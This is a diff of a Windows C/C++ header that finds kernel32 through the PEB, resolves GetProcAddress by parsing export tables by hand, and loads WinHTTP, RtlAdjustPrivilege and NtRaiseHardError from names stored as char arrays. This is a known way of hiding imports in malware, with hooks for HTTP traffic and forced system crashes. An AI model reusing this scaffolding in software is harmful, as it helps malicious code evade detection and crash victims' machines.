@@ -1,34 +1,35 @@
 #pragma once
 
-#ifndef _DEFINE_H_
-#define _DEFINE_H_
+#ifndef _API2_H_
+#define _API2_H_
+#include <stdint.h>
 #include <windows.h>
 #include <winhttp.h>
 #include <winternl.h>
 
 // dll
-static char STR_NTDLL[]                     = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0'};
-static char STR_WINHTTP[]                   = {'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};
+static char STR_NTDLL[10]                     = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0'};
+static char STR_WINHTTP[12]                   = {'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};
 
 
-static char STR_LOADLIBRARYA[]              = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0'};
-static char STR_GETPROCADDRESS[]            = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0'};
-
-//ntdll.dll
-static char STR_RTLADJUSTPRIVILEGE[]        = {'R', 't', 'l', 'A', 'd', 'j', 'u', 's', 't', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e', '\0'};
-static char STR_NTRAISEHARDERROR[]          = {'N', 't', 'R', 'a', 'i', 's', 'e', 'H', 'a', 'r', 'd', 'E', 'r', 'r', 'o', 'r', '\0'};
+static char STR_LOADLIBRARYA[13]              = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0'};
+static char STR_GETPROCADDRESS[15]            = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0'};
 
 //ntdll.dll
-static char STR_WINHTTPOPEN[] 		         = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', '\0'};
-static char STR_WINHTTPCONNECT[]            = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', '\0'};
-static char STR_WINHTTPOPENREQUEST[]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
-static char STR_WINHTTPSENDREQUEST[]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
-static char STR_WINHTTPRECEIVERESPONSE[]    = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', '\0'};
-static char STR_WINHTTPQUERYHEADERS[]       = {'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', '\0'};
-static char STR_WINHTTPQUERYDATAAVAILABLE[] = {'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', '\0'};
-static char STR_WINHTTPREADDATA[]           = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', '\0'};
-static char STR_WINHTTPCLOSEHANDLE[]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
-static char STR_WINHTTPSETOPTION[]          = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', '\0'};
+static char STR_RTLADJUSTPRIVILEGE[19]        = {'R', 't', 'l', 'A', 'd', 'j', 'u', 's', 't', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e', '\0'};
+static char STR_NTRAISEHARDERROR[17]          = {'N', 't', 'R', 'a', 'i', 's', 'e', 'H', 'a', 'r', 'd', 'E', 'r', 'r', 'o', 'r', '\0'};
+
+//ntdll.dll
+static char STR_WINHTTPOPEN[12] 		      = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', '\0'};
+static char STR_WINHTTPCONNECT[15]            = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', '\0'};
+static char STR_WINHTTPOPENREQUEST[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
+static char STR_WINHTTPSENDREQUEST[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
+static char STR_WINHTTPRECEIVERESPONSE[23]    = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', '\0'};
+static char STR_WINHTTPQUERYHEADERS[20]       = {'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', '\0'};
+static char STR_WINHTTPQUERYDATAAVAILABLE[26] = {'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', '\0'};
+static char STR_WINHTTPREADDATA[16]           = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', '\0'};
+static char STR_WINHTTPCLOSEHANDLE[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
+static char STR_WINHTTPSETOPTION[17]          = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', '\0'};
 
 
 typedef FARPROC(WINAPI* _GetProcAddress)(HMODULE, const char *);
@@ -114,37 +115,79 @@ typedef NTSTATUS(NTAPI* _NtRaiseHardError) (
 	PULONG     reponse
 );
 
+namespace Win32
+{
+	// dll
+	char STR_NTDLL[10]                     = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0'};
+	char STR_WINHTTP[12]                   = {'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};
 
-typedef struct _WINDOWS {
-	struct {
-		HMODULE Ntdll;
-		HMODULE Winhttp;
-		HMODULE Kernel32;
-	} MODULE;
+
+	char STR_LOADLIBRARYA[13]              = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0'};
+	char STR_GETPROCADDRESS[15]            = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0'};
+
+	//ntdll.dll
+	char STR_RTLADJUSTPRIVILEGE[19]        = {'R', 't', 'l', 'A', 'd', 'j', 'u', 's', 't', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e', '\0'};
+	char STR_NTRAISEHARDERROR[17]          = {'N', 't', 'R', 'a', 'i', 's', 'e', 'H', 'a', 'r', 'd', 'E', 'r', 'r', 'o', 'r', '\0'};
+
+	//ntdll.dll
+	char STR_WINHTTPOPEN[12] 		      = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', '\0'};
+	char STR_WINHTTPCONNECT[15]            = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', '\0'};
+	char STR_WINHTTPOPENREQUEST[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
+	char STR_WINHTTPSENDREQUEST[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
+	char STR_WINHTTPRECEIVERESPONSE[23]    = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', '\0'};
+	char STR_WINHTTPQUERYHEADERS[20]       = {'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', '\0'};
+	char STR_WINHTTPQUERYDATAAVAILABLE[26] = {'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', '\0'};
+	char STR_WINHTTPREADDATA[16]           = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', '\0'};
+	char STR_WINHTTPCLOSEHANDLE[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
+	char STR_WINHTTPSETOPTION[17]          = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', '\0'};
+
+
+    PVOID GetKernel32(void)
+    {
+        PEB*                  peb            = (PEB*)__readgsqword(0x60);
+        LDR_DATA_TABLE_ENTRY* pKernel32Entry = CONTAINING_RECORD(peb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+        return pKernel32Entry->DllBase;
+    }
+
+
+    _GetProcAddress GetGetProcAddress(void)
+    {
+        IMAGE_DOS_HEADER*       pDosHeader            = (IMAGE_DOS_HEADER*)GetKernel32();
+        IMAGE_NT_HEADERS*       pNtHeaders            = (IMAGE_NT_HEADERS *)(pDosHeader->e_lfanew + (size_t)pDosHeader);
+        IMAGE_EXPORT_DIRECTORY* pExportTable          = (IMAGE_EXPORT_DIRECTORY *)((size_t)pDosHeader + pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+        const int32_t*          pNameTablesOffset     = (const int32_t *)((size_t)pDosHeader + pExportTable->AddressOfNames);
+        const int16_t*          pOrdinalTablesOffset  = (const int16_t *)((size_t)pDosHeader + pExportTable->AddressOfNameOrdinals);
+        const int32_t*          pAddressTablesOffset  = (const int32_t *)((size_t)pDosHeader + pExportTable->AddressOfFunctions);
+        
+        int i = 0;
+        while(strcmp((char*)pDosHeader + pNameTablesOffset[i], STR_GETPROCADDRESS) != 0) {++i;}
+        return (_GetProcAddress)((size_t)pDosHeader + pAddressTablesOffset[pOrdinalTablesOffset[i]]);
+    }
+
+
+    HMODULE Kernel32               = (HMODULE)GetKernel32();
+    _GetProcAddress GetProcAddress = GetGetProcAddress();
+    _LoadLibraryA LoadLibraryA     = (_LoadLibraryA)GetProcAddress(Kernel32, STR_LOADLIBRARYA);
 	
-	struct {
-		_GetProcAddress rGetProcAddress;
-		_LoadLibraryA   rLoadLibraryA;
-		
-		//winhttp.dll
-		_WinHttpOpen               rWinHttpOpen;
-		_WinHttpConnect            rWinHttpConnect;
-		_WinHttpOpenRequest        rWinHttpOpenRequest;
-		_WinHttpSendRequest        rWinHttpSendRequest;
-		_WinHttpReceiveResponse    rWinHttpReceiveResponse;
-		_WinHttpQueryHeaders       rWinHttpQueryHeaders;
-		_WinHttpQueryDataAvailable rWinHttpQueryDataAvailable;
-		_WinHttpReadData           rWinHttpReadData;
-		_WinHttpCloseHandle        rWinHttpCloseHandle;
-		_WinHttpSetOption          rWinHttpSetOption;
-
-		//ntdll.dll
-		_RtlAdjustPrivilege rRtlAdjustPrivilege;
-		_NtRaiseHardError   rNtRaiseHardError;
-	} API;
-} WINDOWS;
+	HMODULE Ntdll   = LoadLibraryA(STR_NTDLL);
+	HMODULE WinHttp = LoadLibraryA(STR_WINHTTP);
 
 
-void BindAPI();
-extern WINDOWS Win32;
+
+    _WinHttpOpen WinHttpOpen                             = (_WinHttpOpen)GetProcAddress(WinHttp, STR_WINHTTPOPEN);
+	_WinHttpConnect WinHttpConnect                       = (_WinHttpConnect)GetProcAddress(WinHttp, STR_WINHTTPCONNECT);
+	_WinHttpOpenRequest WinHttpOpenRequest               = (_WinHttpOpen)GetProcAddress(WinHttp, STR_WINHTTPOPENREQUEST);
+	_WinHttpSendRequest WinHttpSendRequest               = (_WinHttpOpen)GetProcAddress(WinHttp, STR_WINHTTPSENDREQUEST);
+	_WinHttpReceiveResponse WinHttpReceiveResponse       = (_WinHttpOpen)GetProcAddress(WinHttp, STR_WINHTTPRECEIVERESPONSE);
+	_WinHttpQueryHeaders WinHttpQueryHeaders             = (_WinHttpOpen)GetProcAddress(WinHttp, STR_WINHTTPQUERYHEADERS);
+	_WinHttpQueryDataAvailable WinHttpQueryDataAvailable = (_WinHttpOpen)GetProcAddress(WinHttp, STR_WINHTTPQUERYDATAAVAILABLE);
+	_WinHttpReadData WinHttpReadData                     = (_WinHttpOpen)GetProcAddress(WinHttp, STR_WINHTTPREADDATA);
+	_WinHttpCloseHandle WinHttpCloseHandle               = (_WinHttpOpen)GetProcAddress(WinHttp, STR_WINHTTPCLOSEHANDLE);
+	_WinHttpSetOption WinHttpSetOption                   = (_WinHttpOpen)GetProcAddress(WinHttp, STR_WINHTTPSETOPTION);
+
+	_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(Ntdll, STR_RTLADJUSTPRIVILEGE);
+	_NtRaiseHardError NtRaiseHardError     = (_NtRaiseHardError)GetProcAddress(Ntdll, STR_NTRAISEHARDERROR);
+} // namespace Win32
+
+
 #endif
